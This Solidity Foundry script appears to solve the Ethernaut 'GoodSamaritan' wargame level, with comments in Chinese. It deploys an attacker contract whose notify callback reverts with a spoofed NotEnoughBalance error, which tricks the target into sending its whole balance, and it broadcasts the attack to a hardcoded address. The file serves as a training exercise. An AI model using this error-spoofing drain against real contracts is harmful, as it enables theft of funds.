// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Script, console} from "forge-std/Script.sol";
import {GoodSamaritan, INotifyable} from "../src/Level27.sol";

contract Attacker is INotifyable {
    GoodSamaritan level;

    error NotEnoughBalance();

    constructor(address level_) public {
        level = GoodSamaritan(level_);
    }

    function attack() external {
        level.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) revert NotEnoughBalance();
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x28AF65c81B2a3EfaD0Af0ce2A019Fd6fc1604D24;

        Attacker attacker = new Attacker(levelAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}
